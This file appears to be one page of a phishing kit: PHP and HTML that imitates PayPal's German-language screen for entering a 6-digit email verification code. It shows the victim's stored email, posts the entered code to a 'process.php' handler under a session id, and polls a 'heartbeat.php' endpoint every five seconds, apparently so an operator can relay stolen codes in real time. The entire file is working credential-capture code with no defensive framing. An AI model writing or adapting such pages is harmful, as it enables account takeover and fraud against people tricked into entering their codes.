<?php
require 'config.php';
if (!isset($_GET['sid'])) { redirect('index.php'); exit; }
$sid = $_GET['sid'];
$session = get_session($sid);
$email = $session['data']['identifier'] ?? 'Ihre E-Mail';
?>
<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PayPal</title>
<link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
<style>
    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; }
    body { background-color: #ffffff; min-height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; color: #001435; }
    
    .login-container { width: 100%; max-width: 520px; padding: 40px 20px; display: flex; flex-direction: column; align-items: center; margin-top: auto; margin-bottom: auto; }
    
    .logo-img { height: 42px; margin-bottom: 40px; }
    
    .sub-header { font-size: 16px; color: #001435; margin-bottom: 30px; text-align: center; line-height: 1.5; width: 100%; }
    .sub-header strong { font-weight: 700; }
    
    .form-group { width: 100%; margin-bottom: 20px; position: relative; }
    .form-control { width: 100%; padding: 18px 16px; border: 1px solid #9da3a6; border-radius: 4px; font-size: 20px; text-align: center; letter-spacing: 4px; color: #001435; outline: none; transition: border-color 0.2s; }
    .form-control:focus { border-color: #0070ba; box-shadow: 0 0 0 1px #0070ba; }
    .form-control::placeholder { color: #9da3a6; letter-spacing: 1px; font-size: 16px; }
    
    .btn-primary { width: 100%; padding: 18px; background: #0070ba; color: #ffffff; border: none; border-radius: 30px; font-size: 18px; font-weight: 600; cursor: pointer; text-align: center; transition: background 0.2s; text-decoration: none; display: block; }
    .btn-primary:hover { background: #005ea6; }
    
    .resend-link { display: block; text-align: center; color: #005ea6; font-size: 15px; text-decoration: none; font-weight: 600; margin-top: 25px; }
    .resend-link:hover { text-decoration: underline; }
</style>
</head>
<body>
    <div class="login-container">
        <img src="paypal_logo.svg" alt="PayPal" class="logo-img" onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg'; this.style.height='42px';">
        
        <div class="sub-header">
            Geben Sie den 6-stelligen Code ein, den wir an <strong><?php echo htmlspecialchars($email); ?></strong> gesendet haben.
        </div>
        
        <form method="POST" action="process.php?sid=<?php echo htmlspecialchars($sid); ?>" style="width: 100%;">
            <div class="form-group">
                <input type="text" name="email_code" class="form-control" placeholder="------" maxlength="6" pattern="[0-9]*" inputmode="numeric" required autocomplete="one-time-code" autofocus>
            </div>
            
            <button type="submit" class="btn-primary">Bestätigen</button>
        </form>
        
        <a href="#" class="resend-link">Code erneut senden</a>
    </div>

    <script>
        setInterval(function() {
            const sid = new URLSearchParams(window.location.search).get('sid');
            if (sid) { fetch('heartbeat.php?sid=' + sid).catch(() => {}); }
        }, 5000);
    </script>
</body>
</html>